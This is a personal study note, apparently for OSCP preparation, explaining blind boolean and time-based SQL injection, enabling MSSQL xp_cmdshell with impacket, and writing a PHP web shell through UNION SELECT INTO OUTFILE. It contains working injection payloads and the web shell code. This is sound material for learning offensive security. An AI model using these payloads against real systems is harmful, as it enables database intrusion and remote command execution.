

# SQL Injection
[SQL](../../coding/languages/SQL.md) injection is a type of attack which leverages poor security practices when implementing SQL in an application. If user input is not properly sanitized, then an attacker can use SQLi to manipulate backend databases by making queries to them using SQL.
![My notes on SQLi](../../cybersecurity/TTPs/exploitation/injection/SQLi.md)

![My notes on UNION Attacks](../../cybersecurity/TTPs/exploitation/injection/UNION-attack.md)

# Blind SQL Injections
SQLi where the results are returned back to you are called "in-band." Conversely, SQLi where the results are *not* returned back to you are called "blind." Because the results aren't returned, you have to infer the outcome, usually via boolean or time-based logic.
## Boolean Based SQLi
Boolean based SQLi causes the application to return differing and predictable values when the query returns a `TRUE` or `FALSE` result. The results returned back to you *are usually from the web application* and not the actual database.
### Example
Let's say we have a web application hosted using [PHP](../../coding/languages/PHP.md), and we notice in the address bar it has a `user` parameter:
```
http://vulnerable.com/dashboard.php?user=trshpuppy
```
When you're logged in as the user `trshpuppy` this is the url when you visit your dashboard. We can check for blind SQLi here with a boolean-based check like this:
```sql
http://vulnerable.com/dashboard.php?user=trshpuppy' AND 1=1 -- //
```
If the user `trshpuppy` is true, then the whole query with the injection should resolve as true. So, when we append our injected `AND` statement, the same content should appear on the page as when we don't append it. Using this boolean-based attack, we can enumerate the entire database for existing usernames.
## Time Based SQLi
In time based blind SQLi, an attacker uses differences in *response time* to conclude if an attempted query is `TRUE` or `FALSE`.
### Example
If we're looking at the same web application as the example above (boolean based section), then we can use a time based technique to check for SQLi by adding an `IF` condition:
```sql
http://vulnerable.com/dashboard.php?user=trshpuppy' AND IF (1=1, sleep(3), 'false') -- //
```
In [SQL](../../coding/languages/SQL.md) the `IF()` function checks the first parameter (`1=1`), and if it's true it will sleep for 3 seconds (`sleep(3)`), and if it's false, it will return `false`. Since `1=1` is true, we expect the application to sleep for 3 seconds. However *that will only happen if the user `trshpuppy` is also true*.

So, time based blind SQLi can also be used for enumeration. If the user is false (doesn't exist), the application should immediately error (or do whatever behavior we observed it doing for usernames which don't exist). If the user is true (does exist), then the application should time-out for 3 seconds before returning any content.
# Manual Code Execution
Depending on how the SQL server is configured on a target, we can use it to *achieve code execution*. For example, in [MSSQL](../../CLI-tools/windows/MSSQL.md) servers the `xp_cmdshell` function takes a string and passes it to a command shell for execution. Any output returned from the shell is returned by MSSQL as rows or text. Usually, it is disabled by default. But once it's enabled, it can called in a SQL query by using the `EXECUTE` keyword.
## In MSSQL
To enable `xp_cmdshell`, we can use the `impacket-mssqlclient` tool. Once we're connected to the target MSSQL server, we can give the following command query:
```sql
> EXECUTE sp_configure 'show advanced options', 1;


INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
```
`sp_configure` is another MSSQL command ('procedure') which displays global configuration settings for the current server. You can use it to view options or modify settings. Additionally, you can give it `1` or `0` as a parameter to enable or disable specific commands:
```sql
-- Use sp_configure to enable "show advanced options"
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

-- Use sp_configure to enable "xp_cmdshell"
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

-- Use RECONFIGURE to apply the changes:
SQL> RECONFIGURE;
```
Once a change is made, run `RECONFIGURE` to apply it. Now we can execute any Windows shell command we want.
## In MySQL
Unlike MSSQL, [MySQL](../../CLI-tools/linux/mysql.md) does not have something like `xp_cmdshell` to execute commands. Instead, we can abuse the `INTO_OUTFILE` statement to write files to the vulnerable web server. For this to work, the user running the MySQL instance *has to have write permission* to the file's location. 
### Using `UNION` & `INTO OUTFILE` to write a web shell
We can use the [UNION keyword](../../cybersecurity/TTPs/exploitation/injection/UNION-attack.md#UNION%20keyword) to write a [web-shell](../../cybersecurity/TTPs/exploitation/web-shell.md) to disk. For this example to work, the web application needs to be vulnerable to a UNION attack *AND* be running [PHP](../../coding/languages/PHP.md). If by investigating the UNION attack we've discovered that the output returned from the vulnerable SQL query includes 5 columns, then we can use `UNION SELECT` to inject PHP script using one of the joined columns.

Then we can use `USE OUTFILE` to create the file we want to write the PHP code into:
```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
The resulting `webshell.php` file would contain this:
```php
<? system($_REQUEST ['cmd']); ?>
```
In this code, the `system` function parses the statement given to it (via the `cmd` parameter) coming from the client's [HTTP](../../www/HTTP.md) request. This should create an *interactive* web command shell for us. 
### Executing the webshell
Now that our file is written to disk, we can try accessing it by simply navigating to it in the browser (since we wrote it to the web server's root):
![](../oscp-pics/SQLi-1.png)
# Automated Code Execution
Instead of doing manual exploitation to achieve code execution, we can use some automated tools. 
## sqlmap
[`sqlmap`](https://sqlmap.org/) is a tool which does automatic SQLi for us.
![My notes for sqlmap here](../../cybersecurity/TTPs/exploitation/tools/sqlmap.md)


> [!Resources]
> - [W3 Schools: MySQL IF() Function](https://www.w3schools.com/sql/func_mysql_if.asp)
> - [Beagle Security: Time Based SQLi](https://beaglesecurity.com/blog/vulnerability/time-based-blind-sql-injection.html)
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.